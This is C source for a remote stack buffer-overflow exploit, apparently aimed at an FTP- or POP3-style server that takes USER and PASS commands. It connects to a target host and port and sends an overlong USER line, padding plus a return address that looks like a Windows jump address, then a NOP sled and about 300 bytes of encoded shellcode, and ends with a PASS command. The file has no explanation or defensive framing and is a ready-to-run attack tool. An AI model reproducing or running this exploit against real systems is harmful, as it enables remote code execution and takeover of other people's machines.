#include <stdio.h>

#include <netinet/in.h>

#include <sys/socket.h>

#include <sys/types.h>

#include <netdb.h>

int main(int argc, char **argv)

{

struct sockaddr_in addr;

struct hostent *host;

char buffer[1109];

char buffer2[16];
int s, i;

if(argc != 3)

{

fprintf(stderr, "usage: %s <host> <port>\n", argv[0]);

exit(0);

}

s = socket(AF_INET, SOCK_STREAM, 0);

if(s == -1)

{

perror("socket() failed\n");

exit(0);

}

host = gethostbyname(argv[1]);

if( host == NULL)

{

herror("gethostbyname() failed");

exit(0);

}

addr.sin_addr = *(struct in_addr*)host->h_addr;

addr.sin_family = AF_INET;

addr.sin_port = htons(atol(argv[2]));

 

if(connect(s, &addr, sizeof(addr)) == -1)

{

perror("couldn't connect so server\n");

exit(0);

}
char buffRead[2048];
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);
char shellcode[] = "\xdd\xc4\xd9\x74\x24\xf4\xb8\x8a\xf3\xcb\xc5\x5f\x2b\xc9\xb1"
"\x47\x31\x47\x18\x83\xef\xfc\x03\x47\x9e\x11\x3e\x39\x76\x57"
"\xc1\xc2\x86\x38\x4b\x27\xb7\x78\x2f\x23\xe7\x48\x3b\x61\x0b"
"\x22\x69\x92\x98\x46\xa6\x95\x29\xec\x90\x98\xaa\x5d\xe0\xbb"
"\x28\x9c\x35\x1c\x11\x6f\x48\x5d\x56\x92\xa1\x0f\x0f\xd8\x14"
"\xa0\x24\x94\xa4\x4b\x76\x38\xad\xa8\xce\x3b\x9c\x7e\x45\x62"
"\x3e\x80\x8a\x1e\x77\x9a\xcf\x1b\xc1\x11\x3b\xd7\xd0\xf3\x72"
"\x18\x7e\x3a\xbb\xeb\x7e\x7a\x7b\x14\xf5\x72\x78\xa9\x0e\x41"
"\x03\x75\x9a\x52\xa3\xfe\x3c\xbf\x52\xd2\xdb\x34\x58\x9f\xa8"
"\x13\x7c\x1e\x7c\x28\x78\xab\x83\xff\x09\xef\xa7\xdb\x52\xab"
"\xc6\x7a\x3e\x1a\xf6\x9d\xe1\xc3\x52\xd5\x0f\x17\xef\xb4\x47"
"\xd4\xc2\x46\x97\x72\x54\x34\xa5\xdd\xce\xd2\x85\x96\xc8\x25"
"\xea\x8c\xad\xba\x15\x2f\xce\x93\xd1\x7b\x9e\x8b\xf0\x03\x75"
"\x4c\xfd\xd1\xda\x1c\x51\x8a\x9a\xcc\x11\x7a\x73\x07\x9e\xa5"
"\x63\x28\x75\xce\x0e\xd2\x1d\x31\x66\xdd\xd8\xd9\x75\xde\xf3"
"\x45\xf3\x38\x99\x65\x55\x92\x35\x1f\xfc\x68\xa4\xe0\x2a\x15"
"\xe6\x6b\xd9\xe9\xa8\x9b\x94\xf9\x5c\x6c\xe3\xa0\xca\x73\xd9"
"\xcf\xf2\xe1\xe6\x59\xa5\x9d\xe4\xbc\x81\x01\x16\xeb\x9a\x88"
"\x82\x54\xf4\xf4\x42\x55\x04\xa3\x08\x55\x6c\x13\x69\x06\x89"
"\x5c\xa4\x3a\x02\xc9\x47\x6b\xf7\x5a\x20\x91\x2e\xac\xef\x6a"
"\x05\x2c\xd3\xbc\x63\x5a\x3d\x7d";


buffer[0] = 'U';
buffer[1] = 'S';
buffer[2] = 'E';
buffer[3] = 'R';
buffer[4] = ' ';

for(i = 5; i < 490 ; i++)

buffer[i] = 'A';

buffer[490] = '\xD7';
buffer[491] = '\x30';
buffer[492] = '\x9D';
buffer[493] = '\x7C';
buffer[494] = 'C';
buffer[495] = 'C';
buffer[496] = 'C';
buffer[497] = 'C';
for (i = 498; i < 793; i++)

buffer[i] = '\x90';

for (i = 0; i < 308; i++)

buffer[i+793] = shellcode[i];

buffer[1101] = '\r';
buffer[1102] = '\n';
buffer[1103] = '\0';
printf("buffer is: %s\n", buffer);

send(s, buffer, strlen(buffer), 0);
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);

buffer2[0] = 'P';
buffer2[1] = 'A';
buffer2[2] = 'S';
buffer2[3] = 'S';
buffer2[4] = ' ';
buffer2[5] = 'P';
buffer2[6] = 'A';
buffer2[7] = 'S';
buffer2[8] = 'S';
buffer2[9] = 'W';
buffer2[10] = 'O';
buffer2[11] = 'R';
buffer2[12] = 'D';
buffer2[13] = '\r';
buffer2[14] = '\n';
buffer2[15] = '\0';
send(s, buffer2, strlen(buffer2), 0);
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);
close(s);

return 0;

}
